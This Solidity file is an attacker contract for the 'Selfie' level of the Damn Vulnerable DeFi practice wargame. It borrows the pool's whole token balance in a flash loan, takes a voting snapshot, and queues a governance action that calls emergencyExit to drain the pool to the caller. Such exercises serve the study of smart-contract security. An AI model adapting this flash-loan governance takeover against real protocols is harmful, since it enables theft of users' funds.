// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    SelfiePool victimPool;
    SimpleGovernance poolGov;
    DamnValuableTokenSnapshot token;

    constructor(
        address _victimPool,
        address _poolGov,
        address _token
    ) {
        victimPool = SelfiePool(_victimPool);
        poolGov = SimpleGovernance(_poolGov);
        token = DamnValuableTokenSnapshot(_token);
    }

    // entry point
    function attack() external returns (uint256) {
        uint256 _maxFlashLoan = victimPool.maxFlashLoan(address(token));
        // init flash loan; carry on in `onFlashLoan`.
        victimPool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            _maxFlashLoan,
            ""
        );
        // back here after flash loan
        uint256 actionId = poolGov.queueAction(
            address(victimPool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", msg.sender)
        );

        return actionId;
    }

    function executeAttack(uint256 _actionId) external returns (bool) {
        poolGov.executeAction(_actionId);
        return true;
        
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // create snapshot to give us voting right for the next round.
        DamnValuableTokenSnapshot(token).snapshot();
        // let pool `transferFrom` us.
        token.approve(
            msg.sender,
            amount
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
